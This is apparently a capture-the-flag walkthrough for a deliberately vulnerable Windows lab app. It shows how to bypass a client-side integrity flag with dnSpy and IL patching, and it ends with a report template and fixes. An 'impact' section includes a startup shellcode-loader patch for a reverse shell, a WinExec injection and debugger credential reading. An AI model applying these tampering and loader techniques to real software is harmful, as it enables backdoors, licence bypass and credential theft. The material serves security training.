# #19 — No anti-debug / no self-integrity

**Category:** Process injection · **Tier:** EASY · **Points:** 60 · **CWE:** CWE-693

## Objective

The admin console's **Integrity report** will only print its full report (which contains the `#19` flag) when the managed field `AdminFeatures.IntegrityVerified` is `true`. The app ships with that field hard-set to `false` and has **no anti-debug**, **no CRC check on itself**, and **no attempt to detect that someone flipped the field**. Attach a debugger, flip the field, call the method.

Easier variant: the `#19` flag is also planted to disk at `%APPDATA%\MVTC\flags\v19_debug.txt` as a convenience (so the challenge is solvable without debugging). But the "real" exploit path — the one the challenge rewards — is the debugger flip.

## Prerequisites

- **dnSpy** (or ILSpy + any debugger, dotPeek, or Visual Studio with "attach to process")
- MVTC running

---

## Fast path — read the planted file

```powershell
type "$env:APPDATA\MVTC\flags\v19_debug.txt"
```

Expected: `MVTC{v19_debug_<...>}` → submit for `+60 pts`.

That alone solves the challenge. The real-world lesson comes from doing it the long way:

---

## Full path — flip the bool live

### 1. Attach dnSpy to MVTC.exe

```
dnSpy → File → Open → C:\Program Files\M14R41 Labs\MVTC\MVTC.exe
dnSpy → Debug → Start Debugging... → Attach to Process
                                   → pick MVTC.exe → OK
```

### 2. Find the field

In dnSpy's assembly explorer: expand `MVTC.Core` → `MVTC.Core.Services.Vuln` → `AdminFeatures`. You'll see:

```csharp
public bool IntegrityVerified { get; set; } = false;
```

### 3. Set a breakpoint on the method that uses it

Still in `AdminFeatures`, find `BuildIntegrityReportJson()`:

```csharp
public string BuildIntegrityReportJson()
{
    // VULN: #19 — signature is populated only when IntegrityVerified is
    // true. There is no code anywhere in the app that flips it to true
    // through a legitimate signed-receipt path, so an attacker just flips
    // it in memory.
    var sig = IntegrityVerified ? (_flagLookup(19) ?? "") : "none";
    return JsonSerializer.Serialize(new { signature = sig, ... });
}
```

Right-click the first line → **Add Breakpoint**.

### 4. Trigger the method from the UI

In MVTC: **Admin console → Integrity report → Generate** (or click the equivalent button). dnSpy halts at your breakpoint.

### 5. Flip the field in the Locals window

In dnSpy's **Locals** panel, expand `this`. Find `IntegrityVerified`. Double-click the `false` value → change to `true` → press Enter. Then press **F5** to continue.

The method now takes the `sig = _flagLookup(19)` branch. The returned JSON contains the flag.

### 6. Read the result

The result dialog in MVTC shows the JSON. Copy the `signature` field value:

```json
{
  "signature": "MVTC{v19_debug_<...>}",
  "built_at": "2026-...",
  "modules": [...]
}
```

Submit for `+60 pts`.

---

## Alternative: patch the compiled method

Instead of attaching a live debugger, patch the IL:

```
dnSpy → open MVTC.Core.dll → right-click AdminFeatures.BuildIntegrityReportJson
     → Edit Method (C#)
```

Change:

```csharp
var sig = IntegrityVerified ? (_flagLookup(19) ?? "") : "none";
```

to:

```csharp
var sig = _flagLookup(19) ?? "";
```

Click **Compile** → **File → Save Module...** → overwrite the original DLL. Restart MVTC. The admin-only path now always returns the flag. (The restart loses your session, but the flag is now unconditionally visible.)

---

## Why this works

1. **No anti-debug.** MVTC never calls `IsDebuggerPresent()`, `CheckRemoteDebuggerPresent()`, `NtQueryInformationProcess` (`ProcessDebugPort`), `OutputDebugString` tripwire, or any heartbeat check. A debugger attaches silently.
2. **No self-integrity check.** The on-disk DLL hash is never compared against an expected value. You can patch the DLL on disk and re-launch; nothing fires.
3. **No code signing enforcement.** The DLL isn't Authenticode-signed, and even if it were, MVTC doesn't call `WinVerifyTrust` on its own modules at startup.
4. **Logic-only gate.** A single bool controls the branch. Flipping it bypasses the "integrity verified" semantic entirely — there's no cryptographic check on the actual verification result.

---

## Common failure modes

| Symptom | Fix |
|---|---|
| dnSpy can't attach | Run dnSpy elevated |
| Breakpoint never hits | The right method is `BuildIntegrityReportJson` on `MVTC.Core.Services.Vuln.AdminFeatures`. Confirm you're in `MVTC.Core.dll` (not `MVTC.exe`). You may need to click the UI button that triggers it |
| Locals doesn't show `IntegrityVerified` | Expand `this` not the method parameters. If the property is auto-generated, dnSpy may show the backing field `<IntegrityVerified>k__BackingField` instead — edit that |
| Flag field is empty string | `_flagLookup(19)` returned null. Only happens if `progress.db` is corrupted. Reset the lab: `Remove-Item "$env:APPDATA\MVTC" -Recurse -Force` and re-launch |

---

---

## Concept — what this attack actually is

The challenge is a **logic bypass**, not code injection. The app has a boolean (`IntegrityVerified`) that gates sensitive output. Nothing in the client's trust model prevents an attacker from flipping that boolean in memory. The absence of all four classic defenses makes this trivial:

| Defense | Status in MVTC | What it would do |
|---|---|---|
| **Anti-debug** (`IsDebuggerPresent` etc.) | Missing | Would refuse to run while a debugger is attached |
| **Self-integrity check** | Missing | Would hash its own loaded image at startup, fail-closed on tamper |
| **Code signing enforcement** | Missing | `WinVerifyTrust` on its own DLLs — tampered DLLs would be rejected at load |
| **Server-authoritative gates** | Missing | The real "has integrity been verified" question would be answered by a signed server token, not a client bool |

Any one of those alone would make the attack dramatically harder. All four missing → debugger-flip is a 60-second attack.

**Real-world applicability:** this is one of the **most under-reported findings** on commercial thick-client assessments. Developers assume "the user has admin on their own box, so what's the point of client-side defenses." But those defenses raise the bar against **supply-chain tampering, insider threat, and malware-mediated attack**, not just the user themselves. A pentest report should always call this out when the four defenses are missing.

---

## Discovery — how to spot this in a real target

1. **dnSpy / ILSpy** on every `.dll` and `.exe` → grep decompiled source for `bool.*Verified`, `bool.*Checked`, `bool.*Trusted`, `IsLicensed`, `IsPremium` → each is a candidate for live-flip
2. **winchecksec** on every binary → missing mitigations correlate with missing self-defense
3. **Signature check:** `Get-AuthenticodeSignature *.exe,*.dll` → anything unsigned or self-signed is tamperable
4. **ETW `AntiMalwareAlert`** on the target during an attach — most apps generate zero events; a hardened one would log the attach itself
5. **"Patch and run" smoke test** — change a UI string in the main DLL with dnSpy's "Edit IL instructions" / "Save Module", restart the app, see if the patched string appears. If it does, nothing is verifying integrity

---

## Impact demonstrations

### 1. Pop calc from inside the integrity-gated code path

In dnSpy, add a `WinExec("calc.exe", 1);` call right before the gated `return` in `BuildIntegrityReportJson`:

```csharp
public string BuildIntegrityReportJson()
{
    // Add this line - calls kernel32.WinExec from managed code
    [DllImport("kernel32")] static extern void WinExec(string cmd, uint style);
    WinExec("calc.exe", 1);

    var sig = IntegrityVerified ? (_flagLookup(19) ?? "") : "none";
    // ...
}
```

Save module. Restart MVTC. Trigger the method via the UI. `calc.exe` opens — proves you can insert arbitrary code into the compiled binary and the app runs it.

### 2. Reverse shell on application startup

Patch `App.OnStartup` to launch msfvenom shellcode:

```csharp
protected override void OnStartup(StartupEventArgs e)
{
    base.OnStartup(e);
    // Patched addition - triggers at every app startup
    byte[] sc = Convert.FromBase64String("<base64-encoded shellcode>");
    IntPtr p = VirtualAlloc(IntPtr.Zero, (UIntPtr)sc.Length, 0x3000, 0x40);
    Marshal.Copy(sc, 0, p, sc.Length);
    CreateThread(IntPtr.Zero, UIntPtr.Zero, p, IntPtr.Zero, 0, IntPtr.Zero);
    // ... original code continues ...
}
```

Users launch MVTC → shell beacons out, no visible UI change.

### 3. Credential-dump debugger flip

Attach dnSpy → breakpoint on `AuthService.Login` → when a user logs in, read the plaintext password out of `Session.PlaintextPassword` (which exists in memory as part of #27). No persistence, no file touched — the attacker just needs to be logged into the victim's box with a debugger attached.

---

## Report writeup template

**Finding title:** Absence of client-side integrity, anti-debug, and code-signing controls

**Severity:** Medium (CVSS 5.5)

**CWE:** CWE-693 (Protection Mechanism Failure)

**Description:** The MVTC client ships with none of the standard client-hardening defenses: no anti-debug (`IsDebuggerPresent` is never called), no self-integrity check (the loaded image hash is never compared to the on-disk hash), no Authenticode verification on its own DLLs, and no server-authoritative gating on admin-sensitive responses. The absence of these controls is individually accepted ("the user has admin anyway") but collectively exposes the client to debugger-based data theft, supply-chain substitution, and malware-mediated patching of security-relevant code paths.

**Reproduction:** Attach dnSpy to a running MVTC.exe. In `AdminFeatures.BuildIntegrityReportJson`, flip the `IntegrityVerified` field from `false` to `true` via the Locals pane. Resume. The returned JSON contains the admin-only flag — demonstrating that a single bool is the sole gate on information intended to be released only after a cryptographic verification.

**Impact:** Any secret the client holds in memory (session tokens, decrypted blobs, user credentials via #27) is readable by an attacker on the same host. Any security-relevant branch (admin check, licence check, feature-flag) can be re-pointed by flipping a bool or editing one `return`. Tampered binaries run and behave normally.

**Remediation:**
1. Add a startup self-check: compute SHA-256 of `MVTC.exe` + each loaded `MVTC.*.dll`, require a signed receipt from the auth server that matches
2. Authenticode-sign all binaries and call `WinVerifyTrust` on every loaded module
3. Server-authoritative gates: admin content should not depend on a client bool. The auth server should sign (HMAC) the admin response and the client should only display it after signature validation
4. Add runtime anti-debug (`IsDebuggerPresent`, `CheckRemoteDebuggerPresent`, timing checks). These are defense in depth, not security boundaries, but raise the bar meaningfully for commodity attackers

---

## Secure code fix

- **Replace the bool with a signed receipt.** Compute `H = HMAC-SHA256(code_image_hash || runtime_identity, server_signing_key)` server-side and require the client to attach `H` to any admin-gated response. Flipping a client-side bool no longer helps because the signing key is server-held.
- **Add anti-debug at startup** (defence in depth, not a security boundary):
  - `IsDebuggerPresent()`, `CheckRemoteDebuggerPresent()`, `NtQueryInformationProcess(ProcessDebugPort)` — refuse to run with a debugger attached in `Release` builds
  - `DbgUiRemoteBreakin` hook, `GetTickCount` delta check in a sensitive loop
- **Self-integrity check** at startup: compute SHA-256 of `MVTC.exe` + each loaded `MVTC.*.dll` and compare to a value in a signed receipt from the auth server. Fail-closed if any hash doesn't match.
- **Code signing enforcement** via `SetProcessMitigationPolicy` with `ProcessSignaturePolicy.MicrosoftSignedOnly = true` (plus Authenticode-signing the binary) blocks loading tampered modules.
- Even with all of the above, assume the client can be modified. Make the server authoritative — never let the client's view of "integrity verified" grant admin anywhere.
